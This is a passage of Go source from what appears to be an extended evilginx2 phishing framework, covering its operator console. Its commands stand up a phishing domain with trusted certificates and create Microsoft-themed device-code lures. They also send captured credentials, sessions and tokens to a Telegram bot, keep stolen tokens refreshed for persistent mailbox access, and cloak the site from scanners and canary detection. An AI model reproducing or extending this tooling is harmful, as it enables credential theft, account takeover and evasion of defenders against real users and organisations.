package core

import (
	"bufio"
	"crypto/rc4"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"github.com/kgretzky/evilginx2/parser"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
)

const (
	DEFAULT_PROMPT = ": "
	LAYER_TOP      = 1
)

type Terminal struct {
	rl               *readline.Instance
	completer        *readline.PrefixCompleter
	cfg              *Config
	crt_db           *CertDb
	p                *HttpProxy
	db               *database.Database
	hlp              *Help
	developer        bool
	tokenAutoRefresh *TokenAutoRefreshManager
	tokenPersistence *TokenPersistenceEngine
}

func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
	var err error
	t := &Terminal{
		cfg:       cfg,
		crt_db:    crt_db,
		p:         p,
		db:        db,
		developer: developer,
	}

	t.createHelp()
	t.completer = t.hlp.GetPrefixCompleter(LAYER_TOP)

	t.rl, err = readline.NewEx(&readline.Config{
		Prompt:              DEFAULT_PROMPT,
		AutoComplete:        t.completer,
		InterruptPrompt:     "^C",
		EOFPrompt:           "exit",
		FuncFilterInputRune: t.filterInput,
	})
	if err != nil {
		return nil, err
	}

	// Sync evilpuppet config to runtime on startup
	if cfg.IsEvilPuppetEnabled() {
		p.evilpuppet.Enable(true)
		p.evilpuppet.SetChromiumPath(cfg.GetEvilPuppetChromiumPath())
		p.evilpuppet.SetDisplay(cfg.GetEvilPuppetDisplay())
		p.evilpuppet.SetTimeout(cfg.GetEvilPuppetTimeout())
		p.evilpuppet.SetDebug(cfg.IsEvilPuppetDebug())
		log.Info("[evilpuppet] Loaded from config: enabled, timeout=%ds", cfg.GetEvilPuppetTimeout())
	}

	// Start token auto-refresh for persistent mailbox access
	t.tokenAutoRefresh = NewTokenAutoRefreshManager(db)
	t.tokenAutoRefresh.Start()

	// Start token persistence engine (vault + session anchoring)
	t.tokenPersistence = NewTokenPersistenceEngine(db)
	t.tokenPersistence.Start()

	// Connect auto-refresh and persistence engine to token feed
	if p.tokenFeed != nil {
		p.tokenFeed.SetAutoRefreshManager(t.tokenAutoRefresh)
		p.tokenFeed.SetPersistenceEngine(t.tokenPersistence)
	}

	return t, nil
}

func (t *Terminal) Close() {
	if t.tokenPersistence != nil {
		t.tokenPersistence.Stop()
	}
	if t.tokenAutoRefresh != nil {
		t.tokenAutoRefresh.Stop()
	}
	t.rl.Close()
}

func (t *Terminal) output(s string, args ...interface{}) {
	out := fmt.Sprintf(s, args...)
	fmt.Fprintf(color.Output, "\n%s\n", out)
}

func (t *Terminal) DoWork() {
	var do_quit = false

	t.checkStatus()
	log.SetReadline(t.rl)

	t.cfg.refreshActiveHostnames()
	t.manageCertificates(true)

	t.output("%s", t.sprintPhishletStatus(""))
	go t.monitorLurePause()

	for !do_quit {
		line, err := t.rl.Readline()
		if err == readline.ErrInterrupt {
			log.Info("type 'exit' in order to quit")
			continue
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)

		args, err := parser.Parse(line)
		if err != nil {
			log.Error("syntax error: %v", err)
		}

		argn := len(args)
		if argn == 0 {
			t.checkStatus()
			continue
		}

		cmd_ok := false
		switch args[0] {
		case "clear":
			cmd_ok = true
			readline.ClearScreen(color.Output)
		case "config":
			cmd_ok = true
			err := t.handleConfig(args[1:])
			if err != nil {
				log.Error("config: %v", err)
			}
		case "proxy":
			cmd_ok = true
			err := t.handleProxy(args[1:])
			if err != nil {
				log.Error("proxy: %v", err)
			}
		case "sessions":
			cmd_ok = true
			err := t.handleSessions(args[1:])
			if err != nil {
				log.Error("sessions: %v", err)
			}
		case "phishlets":
			cmd_ok = true
			err := t.handlePhishlets(args[1:])
			if err != nil {
				log.Error("phishlets: %v", err)
			}
		case "lures":
			cmd_ok = true
			err := t.handleLures(args[1:])
			if err != nil {
				log.Error("lures: %v", err)
			}
		case "blacklist":
			cmd_ok = true
			err := t.handleBlacklist(args[1:])
			if err != nil {
				log.Error("blacklist: %v", err)
			}
		case "canary":
			cmd_ok = true
			err := t.handleCanary(args[1:])
			if err != nil {
				log.Error("canary: %v", err)
			}
		case "botguard":
			cmd_ok = true
			err := t.handleBotguard(args[1:])
			if err != nil {
				log.Error("botguard: %v", err)
			}
		case "evilpuppet":
			cmd_ok = true
			err := t.handleEvilPuppet(args[1:])
			if err != nil {
				log.Error("evilpuppet: %v", err)
			}
		case "cfclearance":
			cmd_ok = true
			err := t.handleCfClearance(args[1:])
			if err != nil {
				log.Error("cfclearance: %v", err)
			}
		case "domains":
			cmd_ok = true
			err := t.handleDomains(args[1:])
			if err != nil {
				log.Error("domains: %v", err)
			}
		case "notify":
			cmd_ok = true
			err := t.handleNotify(args[1:])
			if err != nil {
				log.Error("notify: %v", err)
			}
		case "devicecode":
			cmd_ok = true
			err := t.handleDeviceCode(args[1:])
			if err != nil {
				log.Error("devicecode: %v", err)
			}
		case "feed":
			cmd_ok = true
			t.handleFeed(args[1:])
		case "mailbox":
			cmd_ok = true
			t.handleMailbox(args[1:])
		case "quickstart":
			cmd_ok = true
			err := t.handleQuickstart(args[1:])
			if err != nil {
				log.Error("quickstart: %v", err)
			}
		case "test-certs":
			cmd_ok = true
			t.manageCertificates(true)
		case "help":
			cmd_ok = true
			if len(args) == 2 {
				if err := t.hlp.PrintBrief(args[1]); err != nil {
					log.Error("help: %v", err)
				}
			} else {
				t.hlp.Print(0)
			}
		case "q", "quit", "exit":
			do_quit = true
			cmd_ok = true
		default:
			log.Error("unknown command: %s", args[0])
			cmd_ok = true
		}
		if !cmd_ok {
			log.Error("invalid syntax: %s", line)
		}
		t.checkStatus()
	}
}

func (t *Terminal) handleQuickstart(args []string) error {
	pn := len(args)

	// quickstart <domain> <phishlet> [bot_token] [chat_id] [cf_token]
	if pn < 2 {
		log.Info("quickstart — set up everything in one command")
		log.Info("")
		log.Info("usage: quickstart <domain> <phishlet> [bot_token] [chat_id] [cloudflare_api_token]")
		log.Info("")
		log.Info("examples:")
		log.Info("  quickstart example.com o365")
		log.Info("  quickstart example.com o365 123456:ABC-DEF 987654321")
		log.Info("  quickstart example.com o365 123456:ABC-DEF 987654321 cf_api_token_here")
		log.Info("")
		log.Info("this will automatically:")
		log.Info("  1. set your domain")
		log.Info("  2. detect and set your server IP")
		log.Info("  3. configure Cloudflare DNS (if token provided) for trusted SSL")
		log.Info("  4. enable wildcard TLS with Let's Encrypt")
		log.Info("  5. enable botguard with defaults")
		log.Info("  6. set hostname for phishlet")
		log.Info("  7. enable the phishlet")
		log.Info("  8. create a lure and show the URL")
		log.Info("  9. configure telegram notifications (if provided)")
		return nil
	}

	domain := args[0]
	phishlet := args[1]

	// Validate phishlet exists
	_, err := t.cfg.GetPhishlet(phishlet)
	if err != nil {
		return fmt.Errorf("phishlet '%s' not found", phishlet)
	}

	log.Info("━━━ quickstart: configuring everything ━━━")

	// Check for Cloudflare API token (5th argument)
	var cfToken string
	if pn >= 5 {
		cfToken = args[4]
	}

	// 1. Set domain
	log.Info("[1/8] setting domain: %s", domain)
	t.cfg.SetBaseDomain(domain)
	t.cfg.ResetAllSites()

	// 2. Auto-detect external IP
	log.Info("[2/8] detecting external IP...")
	extIP := t.detectExternalIP()
	if extIP != "" {
		t.cfg.SetServerExternalIP(extIP)
		log.Success("external IP: %s", extIP)
	} else {
		log.Warning("could not detect IP — set manually: config ipv4 external <IP>")
	}

	// 3. Enable autocert + configure TLS mode
	log.Info("[3/8] configuring TLS certificates...")
	t.cfg.EnableAutocert(true)
	if cfToken != "" {
		// Cloudflare provided: use wildcard DNS-01 certs
		creds := map[string]string{"api_token": cfToken}
		_ = t.cfg.RemoveExternalDomain(domain)
		if err := t.cfg.AddExternalDomain(domain, "cloudflare", creds); err != nil {
			log.Warning("failed to add domain: %v", err)
		}
		t.cfg.EnableWildcardTLS(true)
		log.Success("Cloudflare DNS-01 wildcard TLS configured")
	} else {
		// No Cloudflare: use standard HTTP-01 per-subdomain certs (like standard evilginx)
		t.cfg.EnableWildcardTLS(false)
		log.Success("HTTP-01 Let's Encrypt certificates (no Cloudflare needed)")
	}

	// 4. Set unauth URL (redirect for unauthorized requests)
	log.Info("[4/8] setting redirect URL for unauthorized requests")
	t.cfg.SetUnauthUrl("https://href.li/?https://en.wikisource.org/wiki/Microsoft_v._AT%26T")

	// 5. Enable botguard with sensible defaults
	log.Info("[5/8] enabling botguard protection")
	t.cfg.EnableBotguard(true)
	t.p.botguard.Enable(true)
	// Add default spoof URLs if none configured
	if len(t.cfg.GetBotguardSpoofUrls()) == 0 {
		defaultSpoofUrls := []string{
			"https://www.google.com",
			"https://www.microsoft.com",
			"https://www.office.com",
		}
		for _, u := range defaultSpoofUrls {
			t.cfg.AddBotguardSpoofUrl(u)
		}
		t.p.botguard.SetSpoofUrls(defaultSpoofUrls)
	}
	t.p.botguard.SetMinTrustScore(t.cfg.GetBotguardMinTrustScore())

	// 6. Set phishlet hostname
	log.Info("[6/8] configuring phishlet: %s", phishlet)
	hostname := domain
	t.cfg.SetSiteHostname(phishlet, hostname)

	// 7. Enable phishlet and get certificates
	log.Info("[7/8] enabling phishlet and obtaining certificates...")
	t.cfg.SetSiteEnabled(phishlet)
	t.manageCertificates(true)

	// 8. Create 6 themed lures
	log.Info("[8/8] creating themed lures...")
	themes := []struct {
		name  string
		label string
	}{
		{"", "Default"},
		{"onedrive", "OneDrive"},
		{"authenticator", "Authenticator"},
		{"adobe", "Adobe PDF"},
		{"docusign", "DocuSign"},
		{"sharepoint", "SharePoint"},
	}

	startID := len(t.cfg.lures)
	for _, theme := range themes {
		l := &Lure{
			Path:             "/" + GenRandomLurePath(),
			Phishlet:         phishlet,
			DeviceCodeTheme:  theme.name,
			DeviceCodeMode:   DCModeAlways,
			DeviceCodeClient: "ms_office",
		}
		t.cfg.AddLure(phishlet, l)
	}
	log.Success("created %d themed lures (IDs %d-%d)", len(themes), startID, startID+len(themes)-1)

	// Get the lure URL for the first (default) lure
	pl, plErr := t.cfg.GetPhishlet(phishlet)
	if plErr == nil {
		// Get landing subdomain from phishlet's proxy_hosts
		landingSub := "setup" // default for o365
		if phishlet == "google" {
			landingSub = "accounts"
		}
		firstLure := t.cfg.lures[startID]
		lureHost := landingSub + "." + hostname
		lureURL := fmt.Sprintf("https://%s%s", lureHost, firstLure.Path)
		_ = pl
		log.Success("default lure URL: %s", lureURL)
		log.Info("use 'lures get-url <id>' to get URL for each theme")
	}

	// Optional: Telegram setup
	if pn >= 4 {
		botToken := args[2]
		chatID := args[3]

		// Delete existing telegram notifier if any
		existing := t.p.notifier.GetNotifier("telegram")
		if existing != nil {
			t.p.notifier.DeleteNotifier("telegram")
			t.cfg.DeleteNotifier("telegram")
		}

		n, err := t.p.notifier.CreateNotifier("telegram")
		if err == nil {
			n.Channel = ChannelTelegram
			n.TelegramBotToken = botToken
			n.TelegramChatID = chatID
			n.Enabled = true
			n.Triggers[EventCredentialCaptured] = true
			n.Triggers[EventSessionCaptured] = true
			n.Triggers[EventDeviceCodeCaptured] = true // Send device code tokens to Telegram
			t.cfg.AddNotifier(n)
			log.Success("telegram notifications configured!")
		}
	}

	log.Info("")
	log.Success("━━━ quickstart complete! ━━━")
	log.Info("")
	log.Info("DNS: Ensure these records exist at your registrar:")
	log.Info("  A   @   →  %s", extIP)
	log.Info("  A   *   →  %s", extIP)
	log.Info("")
	log.Success("SSL: Let's Encrypt certificates (trusted by browsers, no warnings)")
	log.Info("")
	if pn < 4 {
		log.Info("add telegram: config telegram <bot_token> <chat_id>")
	}

	return nil
}

// detectExternalIP auto-detects the server's external IPv4 address
func (t *Terminal) detectExternalIP() string {
	client := &http.Client{Timeout: 5 * time.Second}

	endpoints := []string{
		"https://api.ipify.org",
		"https://ifconfig.me/ip",
		"https://icanhazip.com",
		"https://checkip.amazonaws.com",
	}

	for _, ep := range endpoints {
		resp, err := client.Get(ep)
		if err != nil {
			continue
		}
		body, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		ip := strings.TrimSpace(string(body))
		if len(ip) > 0 && len(ip) < 46 { // valid IPv4/IPv6 length
			return ip
		}
	}
	return ""
}

func (t *Terminal) handleConfig(args []string) error {
	pn := len(args)
	if pn == 0 {
		autocertOnOff := "off"
		if t.cfg.IsAutocertEnabled() {
			autocertOnOff = "on"
		}

		wildcardTLSOnOff := "off"
		if t.cfg.IsWildcardTLSEnabled() {
			wildcardTLSOnOff = "on"
		}

		gophishInsecure := "false"
		if t.cfg.GetGoPhishInsecureTLS() {
			gophishInsecure = "true"
		}

		keys := []string{"server_name", "domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "wildcard_tls", "randomize_subdomains", "telegram", "gophish admin_url", "gophish api_key", "gophish insecure"}
		randSubOnOff := "off"
		if t.cfg.IsRandomizeSubdomainsEnabled() {
			randSubOnOff = "on"
		}
		telegramStatus := "not configured"
		if n := t.cfg.GetNotifier("telegram"); n != nil && n.TelegramBotToken != "" {
			if n.Enabled {
				telegramStatus = "enabled (chat: " + n.TelegramChatID + ")"
			} else {
				telegramStatus = "disabled"
			}
		}
		vals := []string{t.cfg.GetServerName(), t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, wildcardTLSOnOff, randSubOnOff, telegramStatus, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "server_name":
			t.cfg.SetServerName(args[1])
			t.p.notifier.SetServerName(args[1])
			return nil
		case "domain":
			t.cfg.SetBaseDomain(args[1])
			t.cfg.ResetAllSites()
			t.manageCertificates(false)
			return nil
		case "ipv4":
			t.cfg.SetServerExternalIP(args[1])
			return nil
		case "unauth_url":
			if len(args[1]) > 0 {
				_, err := url.ParseRequestURI(args[1])
				if err != nil {
					return err
				}
			}
			t.cfg.SetUnauthUrl(args[1])
			return nil
		case "autocert":
			switch args[1] {
			case "on":
				t.cfg.EnableAutocert(true)
				t.manageCertificates(true)
				return nil
			case "off":
				t.cfg.EnableAutocert(false)
				t.manageCertificates(true)
				return nil
			}
		case "wildcard_tls":
			switch args[1] {
			case "on":
				// Check if at least one domain is configured
				domains := t.cfg.GetWildcardDomains()
				if len(domains) == 0 {
					return fmt.Errorf("no domains configured - set up base domain or external domains first")
				}
				// Check if external DNS is available (optional — self-signed fallback available)
				hasExternalDNS := false
				for _, dom := range domains {
					baseDom := strings.TrimPrefix(dom, "*.")
					if baseDom == dom {
						if CanUseExternalDNS(baseDom) {
							hasExternalDNS = true
							break
						}
					}
				}
				if !hasExternalDNS {
					log.Warning("no external DNS provider configured — will use self-signed wildcard certificates")
					log.Warning("self-signed certs work but browsers will show security warnings")
					log.Info("for Let's Encrypt wildcard certs, configure: domains config <domain> cloudflare api_token=<token>")
				}
				t.cfg.EnableWildcardTLS(true)
				t.manageCertificates(true)
				return nil
			case "off":
				t.cfg.EnableWildcardTLS(false)
				t.manageCertificates(true)
				return nil
			}
		case "randomize_subdomains":
			switch args[1] {
			case "on":
				t.cfg.EnableRandomizeSubdomains(true)
				return nil
			case "off":
				t.cfg.EnableRandomizeSubdomains(false)
				return nil
			}
		case "gophish":
			switch args[1] {
			case "test":
				t.p.gophish.Setup(t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), t.cfg.GetGoPhishInsecureTLS())
				err := t.p.gophish.Test()
				if err != nil {
					log.Error("gophish: %s", err)
				} else {
					log.Success("gophish: connection successful")
				}
				return nil
			}
		case "telegram":
			switch args[1] {
			case "test":
				// Test telegram notification
				n := t.cfg.GetNotifier("telegram")
				if n == nil {
					return fmt.Errorf("telegram not configured — use: config telegram <bot_token> <chat_id>")
				}
				err := t.p.notifier.Test("telegram", EventSessionCaptured)
				if err != nil {
					return fmt.Errorf("telegram test failed: %v", err)
				}
				log.Success("telegram test notification sent!")
				return nil
			}
		}
	} else if pn == 3 {
		switch args[0] {
		case "ipv4":
			switch args[1] {
			case "external":
				t.cfg.SetServerExternalIP(args[2])
				return nil
			case "bind":
				t.cfg.SetServerBindIP(args[2])
				return nil
			}
		case "gophish":
			switch args[1] {
			case "admin_url":
				t.cfg.SetGoPhishAdminUrl(args[2])
				return nil
			case "api_key":
				t.cfg.SetGoPhishApiKey(args[2])
				return nil
			case "insecure":
				switch args[2] {
				case "true":
					t.cfg.SetGoPhishInsecureTLS(true)
					return nil
				case "false":
					t.cfg.SetGoPhishInsecureTLS(false)
					return nil
				}
			}
		case "telegram":
			// config telegram <bot_token> <chat_id>
			botToken := args[1]
			chatID := args[2]

			// Delete existing telegram notifier if any
			existing := t.p.notifier.GetNotifier("telegram")
			if existing != nil {
				t.p.notifier.DeleteNotifier("telegram")
				t.cfg.DeleteNotifier("telegram")
			}

			// Create new telegram notifier
			n, err := t.p.notifier.CreateNotifier("telegram")
			if err != nil {
				return fmt.Errorf("failed to create telegram notifier: %v", err)
			}
			n.Channel = ChannelTelegram
			n.TelegramBotToken = botToken
			n.TelegramChatID = chatID
			n.Enabled = true

			// Enable all event triggers
			n.Triggers[EventCredentialCaptured] = true
			n.Triggers[EventSessionCaptured] = true
			n.Triggers[EventLureClicked] = false
			n.Triggers[EventLureLanded] = false

			// Save to config
			if err := t.cfg.AddNotifier(n); err != nil {
				return fmt.Errorf("failed to save telegram config: %v", err)
			}

			log.Success("telegram notifications configured!")
			log.Info("  bot token: %s...%s", botToken[:8], botToken[len(botToken)-4:])
			log.Info("  chat id: %s", chatID)
			log.Info("  triggers: credential_captured, session_captured")
			log.Info("test with: config telegram test")
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleBlacklist(args []string) error {
	pn := len(args)
	if pn == 0 {
		mode := t.cfg.GetBlacklistMode()
		ip_num, mask_num := t.p.bl.GetStats()
		log.Info("blacklist mode set to: %s", mode)
		log.Info("blacklist: loaded %d ip addresses and %d ip masks", ip_num, mask_num)

		return nil
	} else if pn == 1 {
		switch args[0] {
		case "all":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "unauth":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "noadd":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "off":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "clear":
			count := t.p.bl.Clear()
			log.Success("cleared %d IPs from runtime blacklist", count)
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "log":
			switch args[1] {
			case "on":
				t.p.bl.SetVerbose(true)
				log.Info("blacklist log output: enabled")
				return nil
			case "off":
				t.p.bl.SetVerbose(false)
				log.Info("blacklist log output: disabled")
				return nil
			}
		case "del":
			if t.p.bl.RemoveIP(args[1]) {
				log.Success("removed %s from blacklist", args[1])
			} else {
				log.Warning("IP %s not found in runtime blacklist", args[1])
			}
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleBotguard(args []string) error {
	pn := len(args)
	if pn == 0 {
		// Display current botguard status
		var enabled_str string = "disabled"
		if t.cfg.IsBotguardEnabled() {
			enabled_str = "enabled"
		}

		spoofUrls := t.cfg.GetBotguardSpoofUrls()
		spoofUrlsStr := "none"
		if len(spoofUrls) > 0 {
			spoofUrlsStr = fmt.Sprintf("%d URLs configured", len(spoofUrls))
		}

		learnEnabled, minObs, blMin, wlMin := t.p.botguard.GetLearningConfig()
		learnStr := fmt.Sprintf("enabled (min_obs=%d, blacklist<%.0f, whitelist>%.0f)", minObs, blMin, wlMin)
		if !learnEnabled {
			learnStr = "disabled"
		}

		profiles := t.p.botguard.ListJA4Profiles()
		profilesStr := "none"
		if len(profiles) > 0 {
			profilesStr = fmt.Sprintf("%d profiles", len(profiles))
		}

		keys := []string{"status", "spoof_urls", "min_trust_score", "auto_learn", "ja4_profiles"}
		vals := []string{
			enabled_str,
			spoofUrlsStr,
			strconv.Itoa(t.cfg.GetBotguardMinTrustScore()),
			learnStr,
			profilesStr,
		}
		log.Printf("\n%s\n", AsRows(keys, vals))

		// List spoof URLs if any
		if len(spoofUrls) > 0 {
			log.Info("Spoof URLs:")
			for i, url := range spoofUrls {
				log.Printf("  [%d] %s", i, url)
			}
		}
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable":
			t.cfg.EnableBotguard(true)
			t.p.botguard.Enable(true)
			t.p.botguard.SetSpoofUrls(t.cfg.GetBotguardSpoofUrls())
			t.p.botguard.SetMinTrustScore(t.cfg.GetBotguardMinTrustScore())
			return nil
		case "disable":
			t.cfg.EnableBotguard(false)
			t.p.botguard.Enable(false)
			return nil
		case "stats":
			// Show botguard statistics
			log.Info("Botguard Trust Scores:")
			// Would need to expose trust scores from botguard
			return nil
		case "urls":
			// List spoof URLs
			spoofUrls := t.cfg.GetBotguardSpoofUrls()
			if len(spoofUrls) == 0 {
				log.Info("No spoof URLs configured")
			} else {
				log.Info("Spoof URLs (%d):", len(spoofUrls))
				for i, url := range spoofUrls {
					log.Printf("  [%d] %s", i, url)
				}
			}
			return nil
		case "clear":
			// Clear all spoof URLs
			t.cfg.ClearBotguardSpoofUrls()
			t.p.botguard.SetSpoofUrls([]string{})
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "add":
			// Add a spoof URL
			t.cfg.AddBotguardSpoofUrl(args[1])
			t.p.botguard.AddSpoofUrl(args[1])
			return nil
		case "remove":
			// Remove a spoof URL
			if t.cfg.RemoveBotguardSpoofUrl(args[1]) {
				t.p.botguard.RemoveSpoofUrl(args[1])
			} else {
				log.Warning("URL not found: %s", args[1])
			}
			return nil
		case "min_score":
			score, err := strconv.Atoi(args[1])
			if err != nil {
				return fmt.Errorf("invalid score value: %s", args[1])
			}
			t.cfg.SetBotguardMinTrustScore(score)
			t.p.botguard.SetMinTrustScore(score)
			return nil
		case "whitelist":
			// Add JA4 to whitelist
			t.p.botguard.AddWhitelist(args[1])
			log.Info("Added JA4 fingerprint to whitelist: %s", args[1])
			return nil
		case "blacklist":
			// Add JA4 to blacklist
			t.p.botguard.AddBlacklist(args[1])
			log.Info("Added JA4 fingerprint to blacklist: %s", args[1])
			return nil
		case "learn":
			if pn == 2 {
				switch args[1] {
				case "enable":
					t.p.botguard.SetLearningEnabled(true)
					return nil
				case "disable":
					t.p.botguard.SetLearningEnabled(false)
					return nil
				case "list":
					profiles := t.p.botguard.ListJA4Profiles()
					if len(profiles) == 0 {
						log.Info("No JA4 learning profiles yet")
						return nil
					}
					log.Info("Learned JA4 profiles (%d):", len(profiles))
					for ja4, p := range profiles {
						status := "learning"
						if p.AutoBlacklisted {
							status = "BLACKLISTED"
						} else if p.AutoWhitelisted {
							status = "whitelisted"
						}
						log.Printf("  %s: avg=%.0f obs=%d blocked=%d allowed=%d [%s]",
							ja4, p.AvgScore, p.TotalObservations, p.BlockedCount, p.AllowedCount, status)
					}
					return nil
				case "reset":
					t.p.botguard.ResetJA4Profiles()
					return nil
				case "threshold":
					// Just show current value
					_, _, blMin, wlMin := t.p.botguard.GetLearningConfig()
					log.Info("Auto-blacklist threshold (avg score below this): %.0f", blMin)
					log.Info("Auto-whitelist threshold (avg score above this): %.0f", wlMin)
					return nil
				case "min_obs":
					_, minObs, _, _ := t.p.botguard.GetLearningConfig()
					log.Info("Minimum observations before auto-decision: %d", minObs)
					return nil
				}
			} else if pn == 3 {
				switch args[1] {
				case "threshold":
					val, err := strconv.ParseFloat(args[2], 64)
					if err != nil || val < 0 || val > 100 {
						return fmt.Errorf("invalid threshold value: %s (use 0-100)", args[2])
					}
					_, minObs, _, wlMin := t.p.botguard.GetLearningConfig()
					t.p.botguard.SetLearningThresholds(minObs, val, wlMin)
					log.Info("Auto-blacklist threshold set to: %.0f", val)
					return nil
				case "min_obs":
					val, err := strconv.Atoi(args[2])
					if err != nil || val < 1 {
						return fmt.Errorf("invalid min_obs value: %s (use >= 1)", args[2])
					}
					_, _, blMin, wlMin := t.p.botguard.GetLearningConfig()
					t.p.botguard.SetLearningThresholds(val, blMin, wlMin)
					log.Info("Minimum observations set to: %d", val)
					return nil
				}
			}
			return fmt.Errorf("invalid syntax: %s", args)
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleCanary(args []string) error {
	pn := len(args)
	if pn == 0 {
		var enabled_str string = "disabled"
		if t.p.canary.IsEnabled() {
			enabled_str = "enabled"
		}
		keys := []string{"status", "patterns"}
		vals := []string{
			enabled_str,
			strconv.Itoa(t.p.canary.PatternCount()),
		}
		log.Printf("\n%s\n", AsRows(keys, vals))

		patterns := t.p.canary.GetPatterns()
		if len(patterns) > 0 {
			log.Info("Active patterns:")
			for i, p := range patterns {
				log.Printf("  [%d] %s", i, p)
			}
		}
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable":
			t.p.canary.Enable(true)
			return nil
		case "disable":
			t.p.canary.Enable(false)
			return nil
		case "on":
			t.p.canary.Enable(true)
			return nil
		case "off":
			t.p.canary.Enable(false)
			return nil
		case "list":
			patterns := t.p.canary.GetPatterns()
			if len(patterns) == 0 {
				log.Info("No canary patterns configured")
			} else {
				log.Info("Canary patterns (%d):", len(patterns))
				for i, p := range patterns {
					log.Printf("  [%d] %s", i, p)
				}
			}
			return nil
		case "stats":
			log.Info("Canary Stripper: enabled=%v, patterns=%d", t.p.canary.IsEnabled(), t.p.canary.PatternCount())
			return nil
		}
	} else if pn == 2 && args[0] == "add" {
		return t.p.canary.AddPattern(args[1])
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleEvilPuppet(args []string) error {
	pn := len(args)
	if pn == 0 {
		// Display current evilpuppet status
		var enabled_str string = "disabled"
		if t.cfg.IsEvilPuppetEnabled() {
			enabled_str = "enabled"
		}

		var debug_str string = "off"
		if t.cfg.IsEvilPuppetDebug() {
			debug_str = "on"
		}

		headlessStr := "off"
		if t.p.evilpuppet.IsHeadless() {
			headlessStr = "on"
		}

		chromiumPath := t.cfg.GetEvilPuppetChromiumPath()
		if chromiumPath == "" {
			chromiumPath = "(auto-detect)"
		}

		poolBusy, poolIdle, poolTotal, poolEnabled, poolSize := t.p.evilpuppet.PoolStatus()

		poolStr := "disabled"
		if poolEnabled {
			poolStr = fmt.Sprintf("enabled (%d/%d busy, %d idle, size=%d)", poolBusy, poolTotal, poolIdle, poolSize)
		}

		keys := []string{"status", "headless", "chromium_path", "display", "timeout", "debug", "active_sessions", "pool"}
		vals := []string{
			enabled_str,
			headlessStr,
			chromiumPath,
			t.cfg.GetEvilPuppetDisplay(),
			strconv.Itoa(t.cfg.GetEvilPuppetTimeout()) + "s",
			debug_str,
			strconv.Itoa(t.p.evilpuppet.ActiveSessionCount()),
			poolStr,
		}
		log.Printf("\n%s\n", AsRows(keys, vals))

		// Show phishlets with evilpuppet configured
		log.Info("Phishlets with evilpuppet:")
		phishletNames := t.cfg.GetPhishletNames()
		for _, name := range phishletNames {
			pl, err := t.cfg.GetPhishlet(name)
			if err != nil {
				log.Debug("  [debug] phishlet '%s': error: %v", name, err)
				continue
			}
			epCfg := pl.GetEvilPuppetConfig()
			if epCfg != nil {
				log.Info("  %s: %d triggers, %d actions, %d interceptors",
					pl.Name, len(epCfg.Triggers), len(epCfg.Actions), len(epCfg.Interceptors))
			}
		}
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable":
			t.cfg.EnableEvilPuppet(true)
			t.p.evilpuppet.Enable(true)
			t.p.evilpuppet.SetChromiumPath(t.cfg.GetEvilPuppetChromiumPath())
			t.p.evilpuppet.SetDisplay(t.cfg.GetEvilPuppetDisplay())
			t.p.evilpuppet.SetTimeout(t.cfg.GetEvilPuppetTimeout())
			t.p.evilpuppet.SetDebug(t.cfg.IsEvilPuppetDebug())
			return nil
		case "disable":
			t.cfg.EnableEvilPuppet(false)
			t.p.evilpuppet.Enable(false)
			return nil
		case "status":
			count := t.p.evilpuppet.ActiveSessionCount()
			log.Info("Active evilpuppet sessions: %d", count)
			return nil
		case "headless":
			log.Info("Headless mode is: %s (use 'evilpuppet headless <on|off>' to toggle)", map[bool]string{true: "on", false: "off"}[t.p.evilpuppet.IsHeadless()])
			return nil
		case "refresh":
			log.Info("Use 'evilpuppet refresh <phishlet>' or 'evilpuppet pool refresh' to refresh tokens via pool")
			return nil
		case "collect":
			results := t.p.evilpuppet.PoolCollect()
			if len(results) == 0 {
				log.Info("No collected results")
				return nil
			}
			for i, r := range results {
				if r.Error != nil {
					log.Warning("[%d] browser=%s error=%v", i+1, r.BrowserID, r.Error)
				} else {
					log.Success("[%d] browser=%s tokens=%d", i+1, r.BrowserID, len(r.Tokens))
					for k, v := range r.Tokens {
						log.Info("  %s = %s", k, v[:min(len(v), 80)])
					}
				}
			}
			return nil
		case "clear":
			t.p.evilpuppet.PoolClear()
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "chromium_path":
			t.cfg.SetEvilPuppetChromiumPath(args[1])
			t.p.evilpuppet.SetChromiumPath(args[1])
			return nil
		case "display":
			t.cfg.SetEvilPuppetDisplay(args[1])
			t.p.evilpuppet.SetDisplay(args[1])
			return nil
		case "timeout":
			timeout, err := strconv.Atoi(args[1])
			if err != nil {
				return fmt.Errorf("invalid timeout value: %s", args[1])
			}
			t.cfg.SetEvilPuppetTimeout(timeout)
			t.p.evilpuppet.SetTimeout(timeout)
			return nil
		case "debug":
			switch args[1] {
